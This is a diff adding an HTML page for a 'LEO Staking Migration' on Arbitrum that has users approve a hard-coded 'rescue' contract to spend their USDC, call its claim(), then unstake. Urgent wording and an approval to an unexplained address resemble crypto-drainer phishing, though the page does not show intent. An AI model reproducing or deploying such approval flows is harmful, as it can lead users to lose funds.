@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>LEO Staking Migration</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+      :root {
+        --accent: rgb(224,36,84);
+        --bg: #f6f5f7;
+        --card: #fff;
+      }
+
+      * { box-sizing: border-box; }
+      body {
+        margin: 0; padding: 0;
+        font-family: 'Montserrat', sans-serif;
+        background: var(--bg);
+        display: flex; align-items: center; justify-content: center;
+        height: 100vh;
+      }
+
+      .container {
+        background: var(--card);
+        width: 480px; max-width: 95vw; padding: 40px;
+        border-radius: 16px;
+        box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+        display: flex; flex-direction: column; align-items: stretch;
+        gap: 20px;
+      }
+
+      h1 {
+        text-align: center;
+        color: var(--accent);
+        font-weight: 800;
+        margin-bottom: 8px;
+      }
+
+      p { text-align: center; color: #666; margin-top: 0; }
+
+      input {
+        width: 100%;
+        background: #f0f0f0;
+        border: none;
+        border-radius: 10px;
+        padding: 12px 14px;
+        font-size: 14px;
+        text-align: center;
+      }
+
+      .btn {
+        display: block;
+        width: 100%;
+        background-image: linear-gradient(135deg, var(--accent) 0%, #ef4a79 100%);
+        border: none;
+        border-radius: 30px;
+        color: #fff;
+        font-size: 14px;
+        font-weight: 700;
+        letter-spacing: .8px;
+        text-transform: uppercase;
+        padding: 14px;
+        cursor: pointer;
+        box-shadow: 0 6px 12px rgba(224,36,84,0.25);
+        transition: all .2s ease;
+      }
+
+      .btn:hover { filter: brightness(1.1); box-shadow: 0 8px 16px rgba(224,36,84,0.3); }
+      .btn:disabled { opacity: 0.6; cursor: not-allowed; box-shadow: none; }
+
+      .readonly {
+        background: #eee;
+        border-radius: 10px;
+        padding: 10px;
+        font-size: 13px;
+        text-align: center;
+        color: #333;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>LEO Staking Migration</h1>
+      <p>Perform the 3 required transactions to withdraw your funds safely.</p>
+
+      <button class="btn" id="btnApprove" disabled>1) Approve Contract</button>
+      <button class="btn" id="btnClaim" disabled>2) Claim Rewards</button>
+      <button class="btn" id="btnUnstake" disabled>3) Unstake</button>
+
+      <div class="readonly" id="status">Status: Not connected</div>
+      <button class="btn" id="connect">Connect Wallet</button>
+    </div>
+
+    <script>
+      const CONFIG = {
+        chainIdHex: '0xa4b1', // Arbitrum One
+        usdc: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
+        rescue: '0xaA54cEE1e82A4Aa717C0DBa76e3Ff7A50AB2986d',
+        staking: '0x57D56a3E8056Ea557Df1c369759993BB1d4cab99'
+      };
+
+      const ERC20_ABI = [
+        'function approve(address spender, uint256 amount) external returns (bool)',
+        'function allowance(address owner, address spender) external view returns (uint256)'
+      ];
+
+      const RESCUE_ABI = [
+        'function claim() external'
+      ];
+      const STAKING_ABI = [
+        'function unstake(uint256 amount) external',
+        'function earned(address user) external view returns (uint256)',
+        'function balanceOf(address user) external view returns (uint256)'
+      ];
+
+      let provider, signer, usdc, rescue, staking, address;
+
+      const $ = id => document.getElementById(id);
+      const status = msg => $('status').textContent = 'Status: ' + msg;
+
+      async function connect() {
+        if (!window.ethereum) return alert('No wallet found');
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send('eth_requestAccounts', []);
+        signer = provider.getSigner();
+        address = await signer.getAddress();
+
+        // Ensure Arbitrum network
+        const current = await window.ethereum.request({ method: 'eth_chainId' });
+        if (current.toLowerCase() !== CONFIG.chainIdHex.toLowerCase()) {
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: CONFIG.chainIdHex }],
+            });
+          } catch (switchError) {
+            // If the chain hasn't been added to MetaMask
+            if (switchError && switchError.code === 4902) {
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                  chainId: CONFIG.chainIdHex,
+                  chainName: 'Arbitrum One',
+                  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+                  rpcUrls: ['https://arb1.arbitrum.io/rpc'],
+                  blockExplorerUrls: ['https://arbiscan.io']
+                }],
+              });
+            } else {
+              throw switchError;
+            }
+          }
+        }
+
+        usdc = new ethers.Contract(CONFIG.usdc, ERC20_ABI, signer);
+        rescue = new ethers.Contract(CONFIG.rescue, RESCUE_ABI, signer);
+        staking = new ethers.Contract(CONFIG.staking, STAKING_ABI, signer);
+
+        status('Connected: ' + address.slice(0, 6) + '...' + address.slice(-4));
+        ['btnApprove','btnClaim','btnUnstake'].forEach(id => $(id).disabled = false);
+      }
+
+      async function doApprove() {
+        try {
+          status('Approving...');
+          const earnedAmount = await staking.earned(address);
+          console.log(`earned(): ${earnedAmount}`)
+          const tx = await usdc.approve(CONFIG.rescue, earnedAmount);
+          await tx.wait();
+          status('Approved successfully');
+        } catch(e) {
+          console.log(`approveError`, e)
+          status('Approve failed');
+        }
+      }
+
+      async function doClaim() {
+        try {
+          status('Claiming rewards...');
+          const tx = await rescue.claim();
+          await tx.wait();
+          status('Rewards claimed');
+        } catch(e) {
+          status('Claim failed');
+        }
+      }
+
+      async function doUnstake() {
+        try {
+          const amt = await staking.balanceOf(address);
+          status('Unstaking...');
+          const tx = await staking.unstake(amt);
+          await tx.wait();
+          status('Unstake complete');
+        } catch(e) {
+          status('Unstake failed');
+        }
+      }
+
+      $('connect').onclick = connect;
+      $('btnApprove').onclick = doApprove;
+      $('btnClaim').onclick = doClaim;
+      $('btnUnstake').onclick = doUnstake;
+    </script>
+  </body>
+</html>
